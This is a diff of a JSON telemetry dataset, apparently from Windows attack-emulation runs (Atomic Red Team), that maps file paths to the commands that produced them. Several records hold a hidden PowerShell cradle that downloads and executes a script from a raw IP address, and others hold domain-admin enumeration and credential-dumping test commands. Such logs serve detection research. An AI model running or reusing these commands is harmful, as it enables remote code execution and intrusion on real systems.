+        "filename": "  C:/WINDOWS/system32/WindowsPowerShell/v1.0/Modules/Microsoft.PowerShell.Utility/Microsoft.PowerShell.Utility.psm1\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "ed1e2b24ba5efaf3ca79de9576acf3c3"
     },
     {
-        "filename": "  C:/WINDOWS/assembly/NativeImages_\\\nv4.0.30319_64/Microsoft.Pae3498d9#/90b1514cc40394ceccd206c6302276a2/Microsoft.PowerShell.Commands.Management.ni.dll.aux\"",
+        "filename": "  C:/WINDOWS/assembly/NativeImages_v4.0.30319_64/Microsoft.Pae3498d9#/90b1514cc40394ceccd206c6302276a2/Microsoft.PowerShell.Commands.Management.ni.dll.aux\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "f65e01ee40651d2c54689a18c44dc472"
     },
     {
-        "filename": "  C:/ProgramData/Microsoft/Windows Defender/Platform/4.18.2203.5-0/\\\nMpOAV.dll\"",
+        "filename": "  C:/ProgramData/Microsoft/Windows Defender/Platform/4.18.2203.5-0/MpOAV.dll\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "037fdac5e03efee1ea54fc084681db2c"
     },
     {
-        "filename": "  C:/Users/Administrator/Documents/WindowsPowerShell/Modules/\\\npowershell-yaml/0.4.2/lib/net45/YamlDotNet.dll\"",
+        "filename": "  C:/Users/Administrator/Documents/WindowsPowerShell/Modules/powershell-yaml/0.4.2/lib/net45/YamlDotNet.dll\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "27788ab882ec384b90c3ac1aa2e348ef"
     },
     {
-        "filename": "  C:/ProgramData/Microsoft/Windows Defender/Platform/4.18.2203.5-0/\\\nMpClient.dll\"",
+        "filename": "  C:/ProgramData/Microsoft/Windows Defender/Platform/4.18.2203.5-0/MpClient.dll\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
         "id": "764fca56fee5525bd098ae311e073bfb",
         "key": "b5e9b179a61c3067103bfcf308cc555e"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/__PSScriptPolicyTest_tfd25hsg.n5p.psm1\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/__PSScriptPolicyTest_tfd25hsg.n5p.psm1\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1134.001 -TestNumbers 1",
         "id": "3f11106677a3a7783e77278e987ceab0",
         "key": "07b7e757de3b91e5ad44bb8f77a46455"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/rj51a2aa/rj51a2aa.0.cs\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/rj51a2aa/rj51a2aa.0.cs\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1134.001 -TestNumbers 1",
         "id": "3f11106677a3a7783e77278e987ceab0",
         "key": "2406cc86a71ee13c94a61e42ccecb272"
     },
     {
-        "filename": "  C:/AtomicRedTeam/atomics/T1134.001/\\\nT1134.001.yaml\"",
+        "filename": "  C:/AtomicRedTeam/atomics/T1134.001/T1134.001.yaml\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1134.001 -TestNumbers 1",
         "id": "3f11106677a3a7783e77278e987ceab0",
         "key": "526a0725bb855b9878d0734a170f5fb2"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/rj51a2aa/rj51a2aa.dll\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/rj51a2aa/rj51a2aa.dll\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1134.001 -TestNumbers 1",
         "id": "3f11106677a3a7783e77278e987ceab0",
         "key": "ab5a9eb24bcae2d6da5d61a61c6eb5e8"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/Invoke-AtomicTest-ExecutionLog.csv\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/Invoke-AtomicTest-ExecutionLog.csv\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1134.001 -TestNumbers 1",
         "id": "3f11106677a3a7783e77278e987ceab0",
         "key": "b76721ae49b32d846e95b55d7298fa47"
     },
     {
-        "filename": "  C:/WINDOWS/Microsoft.Net/assembly/\\\nGAC_MSIL/System.Management.Automation/v4.0_3.0.0.0__31bf3856ad364e35/System.Management.Automation.dll\"",
+        "filename": "  C:/WINDOWS/Microsoft.Net/assembly/GAC_MSIL/System.Management.Automation/v4.0_3.0.0.0__31bf3856ad364e35/System.Management.Automation.dll\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1134.001 -TestNumbers 1",
         "id": "3f11106677a3a7783e77278e987ceab0",
         "key": "c3ebb5c83e3487aef316e1b34f822508"
     },
     {
-        "filename": "  C:/AtomicRedTeam/invoke-atomicredteam/\\\nPublic/Default-ExecutionLogger.psm1\"",
+        "filename": "  C:/AtomicRedTeam/invoke-atomicredteam/Public/Default-ExecutionLogger.psm1\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1134.001 -TestNumbers 1",
         "id": "3f11106677a3a7783e77278e987ceab0",
         "key": "c56d5e853730348132502cb2271a681d"
     },
     {
-        "filename": "  C:/WINDOWS/Microsoft.Net/assembly/\\\nGAC_64/mscorlib/v4.0_4.0.0.0__b77a5c561934e089/mscorlib.dll\"",
+        "filename": "  C:/WINDOWS/Microsoft.Net/assembly/GAC_64/mscorlib/v4.0_4.0.0.0__b77a5c561934e089/mscorlib.dll\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1134.001 -TestNumbers 1",
         "id": "3f11106677a3a7783e77278e987ceab0",
         "key": "cbbfebff032ec300145fc6b9d0e6fc56"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/rj51a2aa/rj51a2aa.cmdline\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/rj51a2aa/rj51a2aa.cmdline\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1134.001 -TestNumbers 1",
         "id": "3f11106677a3a7783e77278e987ceab0",
         "key": "d29db8a011fa6aa71be6d995d03b7d61"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/rj51a2aa/rj51a2aa.out\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/rj51a2aa/rj51a2aa.out\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1134.001 -TestNumbers 1",
         "id": "3f11106677a3a7783e77278e987ceab0",
         "key": "e04a7820e335a5d831832edb2e4a10c4"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/__PSScriptPolicyTest_m2z44eio.psf.ps1\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/__PSScriptPolicyTest_m2z44eio.psf.ps1\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1134.001 -TestNumbers 1",
         "id": "3f11106677a3a7783e77278e987ceab0",
         "key": "fe58fce8fea726c4ef207b1489711e0e"
     },
     {
-        "filename": "  C:/Users/Administrator/Desktop/shell/\\\ntest.exe\"",
+        "filename": "  C:/Users/Administrator/Desktop/shell/test.exe\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo test &gt;&gt; test.exe",
         "id": "6ea1872984a507282fc609fa9b9a76ca",
         "key": "34ea7dcd4eced8d57594fcac8b680ccf"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/__PSScriptPolicyTest_iwib0zp3.hmf.ps1\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/__PSScriptPolicyTest_iwib0zp3.hmf.ps1\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo test &gt;&gt; test.exe",
         "id": "6ea1872984a507282fc609fa9b9a76ca",
         "key": "77d9508e59e74195a37a2cd0b8ce1ac1"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/__PSScriptPolicyTest_sv4zhvo4.gr4.psm1\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/__PSScriptPolicyTest_sv4zhvo4.gr4.psm1\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo test &gt;&gt; test.exe",
         "id": "6ea1872984a507282fc609fa9b9a76ca",
         "key": "7c5ee2eec73155098d6c7ac22cf5903d"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/kv5u34xf/kv5u34xf.dll\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/kv5u34xf/kv5u34xf.dll\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo test &gt;&gt; test.exe",
         "id": "6ea1872984a507282fc609fa9b9a76ca",
         "key": "7ee6c068c03d779d80dbdfcaab3155fc"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/kv5u34xf/kv5u34xf.out\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/kv5u34xf/kv5u34xf.out\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo test &gt;&gt; test.exe",
         "id": "6ea1872984a507282fc609fa9b9a76ca",
         "key": "9145fd842910b108e090d7f6f86a406f"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/kv5u34xf/kv5u34xf.cmdline\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/kv5u34xf/kv5u34xf.cmdline\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo test &gt;&gt; test.exe",
         "id": "6ea1872984a507282fc609fa9b9a76ca",
         "key": "aaf10231208b5641b6d2d93be93b9549"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/kv5u34xf/kv5u34xf.0.cs\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/kv5u34xf/kv5u34xf.0.cs\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo test &gt;&gt; test.exe",
         "id": "6ea1872984a507282fc609fa9b9a76ca",
         "key": "fd7bf36d4d2a83fd3d419ab15a7ee298"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/rkdbei0g/rkdbei0g.0.cs\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/rkdbei0g/rkdbei0g.0.cs\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  net group / domain admins/  /domain",
         "id": "6f4214d38f991b8722648c02d50b675b",
         "key": "16c89964605bcd6148c6cd72080e7984"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/__PSScriptPolicyTest_fglmhwe2.2c2.ps1\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/__PSScriptPolicyTest_fglmhwe2.2c2.ps1\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  net group / domain admins/  /domain",
         "id": "6f4214d38f991b8722648c02d50b675b",
         "key": "86b69fd6eeb22a79fe5748cafeac85da"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/rkdbei0g/rkdbei0g.dll\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/rkdbei0g/rkdbei0g.dll\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  net group / domain admins/  /domain",
         "id": "6f4214d38f991b8722648c02d50b675b",
         "key": "92db4ecd70ed3c0e88bbb0570fa97416"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/rkdbei0g/rkdbei0g.out\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/rkdbei0g/rkdbei0g.out\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  net group / domain admins/  /domain",
         "id": "6f4214d38f991b8722648c02d50b675b",
         "key": "9bea8a2aa36f0870477bd30f7c0e5849"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/rkdbei0g/rkdbei0g.cmdline\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/rkdbei0g/rkdbei0g.cmdline\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  net group / domain admins/  /domain",
         "id": "6f4214d38f991b8722648c02d50b675b",
         "key": "a0c1aecb1554ae98ba62b2e17b9ab185"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/__PSScriptPolicyTest_d4hgpxxs.wx0.psm1\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/__PSScriptPolicyTest_d4hgpxxs.wx0.psm1\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  net group / domain admins/  /domain",
         "id": "6f4214d38f991b8722648c02d50b675b",
         "key": "b8fbcbf860fc56342831860d8a2149b9"
     },
     {
-        "filename": "  C:/Users/Administrator/Desktop/T1022/\\\nT1022.txt\"",
-        "cmd": "\"powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1119  \"",
+        "filename": "  C:/Users/Administrator/Desktop/T1022/T1022.txt\"",
+        "cmd": "cmd.exe /C  mkdir C:/%HOMEPATH%/Desktop/T1022  &amp; echo ipconfig /all &gt; C:/%HOMEPATH%/Desktop/T1022/T1022.txt &amp; 7z.exe a -tzip T1022.zip C:/%HOMEPATH%/Desktop/T1022",
         "id": "7e341a3eb12fb991f2bd57f8a717eca2",
         "key": "3d5a982d826c9e45d788c49d4f6fff77"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/__PSScriptPolicyTest_u2d3d04b.sfg.psm1\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/__PSScriptPolicyTest_u2d3d04b.sfg.psm1\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1003.003",
         "id": "7fbf49bfe0c7cde8f5d0f5421c5b18eb",
         "key": "1bd4583e2c62393914a573b74185e687"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/nruqy5cg/nruqy5cg.out\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/nruqy5cg/nruqy5cg.out\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1003.003",
         "id": "7fbf49bfe0c7cde8f5d0f5421c5b18eb",
         "key": "5b3e07a0ce70fcdb065d898f5c611087"
     },
     {
-        "filename": "  C:/AtomicRedTeam/atomics/T1003.003/\\\nT1003.003.yaml\"",
+        "filename": "  C:/AtomicRedTeam/atomics/T1003.003/T1003.003.yaml\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1003.003",
         "id": "7fbf49bfe0c7cde8f5d0f5421c5b18eb",
         "key": "7c5f0159ef9e87730fbde7a02e7ba0ff"
     },
     {
-        "filename": "  C:/WINDOWS/assembly/NativeImages_\\\nv4.0.30319_64/Microsoft.Mf5ac9168#/cd21d52f8c21810552f9f95f991a7bca/Microsoft.Management.Infrastructure.CimCmdlets.ni.dll.aux\"",
+        "filename": "  C:/WINDOWS/assembly/NativeImages_v4.0.30319_64/Microsoft.Mf5ac9168#/cd21d52f8c21810552f9f95f991a7bca/Microsoft.Management.Infrastructure.CimCmdlets.ni.dll.aux\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1003.003",
         "id": "7fbf49bfe0c7cde8f5d0f5421c5b18eb",
         "key": "8018a785595efc92943e5ca54996b75e"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/nruqy5cg/nruqy5cg.cmdline\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/nruqy5cg/nruqy5cg.cmdline\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1003.003",
         "id": "7fbf49bfe0c7cde8f5d0f5421c5b18eb",
         "key": "854cef231e12228467e2d4c8dc57cda8"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/__PSScriptPolicyTest_ijitv5g4.5us.ps1\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/__PSScriptPolicyTest_ijitv5g4.5us.ps1\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1003.003",
         "id": "7fbf49bfe0c7cde8f5d0f5421c5b18eb",
         "key": "86241be1e0eb9c2711aa1e1c3a9960fe"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/nruqy5cg/nruqy5cg.0.cs\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/nruqy5cg/nruqy5cg.0.cs\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1003.003",
         "id": "7fbf49bfe0c7cde8f5d0f5421c5b18eb",
         "key": "8cef87bfa5d3bc2568659a1a2d79e273"
     },
     {
-        "filename": "  C:/WINDOWS/assembly/NativeImages_\\\nv4.0.30319_64/Microsoft.M870d558a#/5d144bec8a19bcf5dbffe101c9fbdb5d/Microsoft.Management.Infrastructure.Native.ni.dll.aux\"",
+        "filename": "  C:/WINDOWS/assembly/NativeImages_v4.0.30319_64/Microsoft.M870d558a#/5d144bec8a19bcf5dbffe101c9fbdb5d/Microsoft.Management.Infrastructure.Native.ni.dll.aux\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1003.003",
         "id": "7fbf49bfe0c7cde8f5d0f5421c5b18eb",
         "key": "caebef8789d1347448c2e09890c04c14"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/nruqy5cg/nruqy5cg.dll\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/nruqy5cg/nruqy5cg.dll\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1003.003",
         "id": "7fbf49bfe0c7cde8f5d0f5421c5b18eb",
         "key": "d3478f23ab4cfdb65087a3bf4127a241"
     },
     {
-        "filename": "  C:/WINDOWS/system32/WindowsPowerShell/\\\nv1.0/Modules/CimCmdlets/CimCmdlets.psd1\"",
+        "filename": "  C:/WINDOWS/system32/WindowsPowerShell/v1.0/Modules/CimCmdlets/CimCmdlets.psd1\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1003.003",
         "id": "7fbf49bfe0c7cde8f5d0f5421c5b18eb",
         "key": "eecda9c587c3db799094618eb6a112be"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/ngon5zfo/ngon5zfo.out\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/ngon5zfo/ngon5zfo.out\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1119",
         "id": "b868af32b977dfa5011d88627c0af145",
         "key": "138a6990378b60b034ffdd3c2f5d99e7"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/ngon5zfo/ngon5zfo.cmdline\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/ngon5zfo/ngon5zfo.cmdline\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1119",
         "id": "b868af32b977dfa5011d88627c0af145",
         "key": "2647a568448eb6e34e9dac4d6b506e88"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/ngon5zfo/ngon5zfo.0.cs\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/ngon5zfo/ngon5zfo.0.cs\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1119",
         "id": "b868af32b977dfa5011d88627c0af145",
         "key": "4c632af4fa8b27e04ca8b7b5dda71299"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/__PSScriptPolicyTest_m44qpm14.e2g.psm1\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/__PSScriptPolicyTest_m44qpm14.e2g.psm1\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1119",
         "id": "b868af32b977dfa5011d88627c0af145",
         "key": "84a6898ec1192a603a3849d9ae5f0ee6"
@@ -576,25 +576,25 @@
         "key": "8d7c475a156c38d4c0f1b24f7ed71322"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/ngon5zfo/ngon5zfo.dll\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/ngon5zfo/ngon5zfo.dll\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1119",
         "id": "b868af32b977dfa5011d88627c0af145",
         "key": "9aefd3475bf42bcffa128bff96698fdc"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/__PSScriptPolicyTest_qt1mzhkk.ga0.ps1\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/__PSScriptPolicyTest_qt1mzhkk.ga0.ps1\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1119",
         "id": "b868af32b977dfa5011d88627c0af145",
         "key": "f46e8a50a79cd71dc216227644741651"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/__PSScriptPolicyTest_etziywi5.3r0.ps1\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/__PSScriptPolicyTest_etziywi5.3r0.ps1\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C   Start-Process ./T1059.003_script.bat",
         "id": "be40b7b24c3f1cfd6679a4b01d056551",
         "key": "4605d9e1ad82b87827f5fdf391bc1ff0"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/fhwdixby/fhwdixby.out\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/fhwdixby/fhwdixby.out\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C   Start-Process ./T1059.003_script.bat",
         "id": "be40b7b24c3f1cfd6679a4b01d056551",
         "key": "780363d0099895ec26e0b6f7834cf892"
@@ -612,91 +612,91 @@
         "key": "9fcca798a3add005bd716c94494a87d1"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/__PSScriptPolicyTest_xk2maufk.ia4.psm1\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/__PSScriptPolicyTest_xk2maufk.ia4.psm1\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C   Start-Process ./T1059.003_script.bat",
         "id": "be40b7b24c3f1cfd6679a4b01d056551",
         "key": "adeed05d341e05727acd270f6a20086c"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/fhwdixby/fhwdixby.dll\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/fhwdixby/fhwdixby.dll\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C   Start-Process ./T1059.003_script.bat",
         "id": "be40b7b24c3f1cfd6679a4b01d056551",
         "key": "bccac3f4837481754886192553b6a0b8"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/fhwdixby/fhwdixby.0.cs\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/fhwdixby/fhwdixby.0.cs\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C   Start-Process ./T1059.003_script.bat",
         "id": "be40b7b24c3f1cfd6679a4b01d056551",
         "key": "c9d3f45f03b3e6c037d07a214914cab1"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/fhwdixby/fhwdixby.cmdline\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/fhwdixby/fhwdixby.cmdline\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C   Start-Process ./T1059.003_script.bat",
         "id": "be40b7b24c3f1cfd6679a4b01d056551",
         "key": "ef88615f01ea4fb1d23847ae215e4954"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/b1oyrudp/b1oyrudp.dll\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/b1oyrudp/b1oyrudp.dll\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1134.001 -TestNumbers 1",
         "id": "dafb9acf62a3c17b609c217b9f6ebafd",
         "key": "01829eb96e7cd83b7f7bc354c2df4356"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/b1oyrudp/b1oyrudp.out\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/b1oyrudp/b1oyrudp.out\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1134.001 -TestNumbers 1",
         "id": "dafb9acf62a3c17b609c217b9f6ebafd",
         "key": "06c59ac001e203f606d6158122c64aaf"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/b1oyrudp/b1oyrudp.0.cs\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/b1oyrudp/b1oyrudp.0.cs\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1134.001 -TestNumbers 1",
         "id": "dafb9acf62a3c17b609c217b9f6ebafd",
         "key": "3c0735d9193d803c87f0e88668bb281b"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/b1oyrudp/b1oyrudp.cmdline\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/b1oyrudp/b1oyrudp.cmdline\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1134.001 -TestNumbers 1",
         "id": "dafb9acf62a3c17b609c217b9f6ebafd",
         "key": "5968773617707937f79760e75944ba9e"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/__PSScriptPolicyTest_kpcr0brw.lcd.psm1\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/__PSScriptPolicyTest_kpcr0brw.lcd.psm1\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1134.001 -TestNumbers 1",
         "id": "dafb9acf62a3c17b609c217b9f6ebafd",
         "key": "67c38f31670b65254317dc71f5c543ad"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/__PSScriptPolicyTest_ts01ezkk.2kw.ps1\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/__PSScriptPolicyTest_ts01ezkk.2kw.ps1\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1134.001 -TestNumbers 1",
         "id": "dafb9acf62a3c17b609c217b9f6ebafd",
         "key": "ec4143f824a8a27b0937e9c061d20a25"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/yajshw1q/CSCC27C022EA157424789D83980FB41D195.TMP\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/yajshw1q/CSCC27C022EA157424789D83980FB41D195.TMP\"",
         "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/yajshw1q/yajshw1q.cmdline",
         "id": "4555f43390fe3494a3d527567cdac02b",
         "key": "2b0725465d45f0db04794d2ad3323eb3"
     },
     {
-        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/\\\nRES9DFD.tmp\"",
+        "filename": "  C:/Users/ADMINI~1/AppData/Local/Temp/RES9DFD.tmp\"",
         "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RES9DFD.tmp   c:/Users/Administrator/AppData/Local/Temp/yajshw1q/CSCC27C022EA157424789D83980FB41D195.TMP",
         "id": "9863e87ac72c1925adc4f266bf99c824",
         "key": "4c5265948d0f62ce2c9cec6119584e7b"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/__PSScriptPolicyTest_rdhssafb.2v4.psm1\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/__PSScriptPolicyTest_rdhssafb.2v4.psm1\"",
         "cmd": "powershell",
         "id": "484f2e9e85b7e62dddd465a31198b585",
         "key": "d47806b06357626339ad7444fb3095d6"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nTemp/__PSScriptPolicyTest_uttj5ob4.qgk.ps1\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Temp/__PSScriptPolicyTest_uttj5ob4.qgk.ps1\"",
         "cmd": "powershell",
         "id": "484f2e9e85b7e62dddd465a31198b585",
         "key": "f7af0ed6e13616c4bd794ce6c457d900"
     },
     {
